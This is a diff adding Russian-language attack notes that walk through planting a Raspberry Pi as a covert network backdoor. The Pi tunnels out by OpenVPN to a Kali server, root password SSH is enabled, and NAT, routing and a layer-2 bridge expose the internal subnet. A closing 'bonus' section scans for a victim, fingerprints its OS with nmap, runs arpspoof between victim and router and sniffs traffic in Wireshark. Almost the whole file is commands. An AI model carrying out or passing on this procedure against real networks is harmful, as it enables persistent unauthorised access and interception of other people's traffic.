@@ -1,0 +1,133 @@
+### создание бэкдора через Raspberry Pi ###
+
+1) на RPi nano /etc/network/interfaces:
+# The primary network interface
+auto ens3
+iface ens3 inet dhcp
+
+service networking restart
+
+apt update && apt upgrade
+
+
+2) на Kali
+curl -O https://raw.githubusercontent.com/angristan/openvpn-install/master/openvpn-install.sh
+chmod +x openvpn-install.sh
+./openvpn-install.sh
+-ip
+-public ip (в случае лабы - они совпадают)
+-n
+-1
+-1
+-1
+-n
+-n
+-подтверждаем и ждем
+-вводим client name (client)
+-1
+в папке появится client.ovpn
+
+настроим ssh соединение, что бы передать client.ovpn на RPi
+nano /etc/ssh/sshd_config
+раскоментить PermitRootLogin и поменять prohibit-password на yes
+service ssh restart
+
+
+3) На RPi
+scp root@<kali ip>:/<путь к файлу>/client.ovpn ./client.conf
+nano client.conf
+#explicit-exit-notify
+#ignore-unknown-option block-outside-dns
+#setenv opt block-outside-dns # Prevent Windows 10 DNS leak
+
+apt install openvpn -y
+cp client.conf /etc/openvpn/
+cd /etc/openvpn
+openvpn --config client.conf 
+останавливаем
+
+
+4) на Kali
+nano /etc/openvpn/server.conf
+#push "dhcp-option DNS 192.168.6.2"
+#push "redirect-gateway def1 bypass-dhcp"
+service openvpn restart
+
+
+5) на RPi
+openvpn --config client.conf
+alt + f2
+ip a 
+создался туннель tun0 с некоторым адресом
+теперь можно подключаться по ssh к RPi через VPN (адрес узнаем ччерез ip a)
+
+
+6) на Kali
+добавляем маршрут к внутренней сети
+ip route add 192.168.1.0/24 via <адрес tun0>
+
+
+7) на RPi
+включаем NAT
+iptables -t nat -A  POSTROUTING -o ens3 -j MASQUERADE
+nano /etc/sysctl.conf
+раскоментить net.ipv4.ip_forward=1
+sysctl -p
+
+
+8) на Kali
+cd /etc/openvpn/ccd/
+nano client
+в созданный файл прописать iroute 192.168.1.0 255.255.255.0
+service openvpn restart
+ip route add 192.168.1.0/24 via 10.8.0.2
+
+
+9) на RPi
+alt + f1 
+перезапускаем сервер
+
+
+включаем L2
+10) на Kali 
+nano /etc/openvpn/server.conf
+#dev tun
+дописать dev tap
+#proto udp
+дописать proto tcp
+
+
+11) на RPi
+останавливаем 
+nano client.conf
+#proto udp
+proto tcp
+#dev tun
+dev tap
+запускаем
+alt+f2
+apt install bridge-utils
+nano /etc/network/interfaces
+iface ens3 inet manual вместо dhcp
+
+#Tap0
+auto tap0
+iface tap0 inet manual
+
+#Bridge
+auto br0
+iface br0 inet dhcp
+	bridge_ports ens3 tap0
+
+service networking restart
+service networking restart второй раз
+
+
+
+### Бонус Атака Arp Spoof ###
+netdiscover -i tap0 	сканируем сеть и ищем айпишник жертвы
+nmap 192.168.1.102 -O	узнаем ось
+arp -a			выводим список адресов
+arpspoof -i tap0 -t <ip роутера> -r <ip жертвы>
+wireshark
+фильтр ip.addr == 192.168.1.105
